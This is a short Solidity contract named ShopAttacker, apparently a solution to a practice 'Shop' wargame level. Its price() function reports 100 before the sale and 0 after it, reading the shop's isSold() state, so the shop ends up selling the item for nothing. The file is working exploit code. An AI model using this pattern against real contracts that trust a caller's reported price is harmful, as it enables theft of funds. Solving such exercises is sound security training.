// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Shop.sol";
import "hardhat/console.sol";

contract ShopAttacker {
    Shop public target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function price() public view returns (uint) {
        if (!target.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }

    function attack() external {
        target.buy();
    }
}
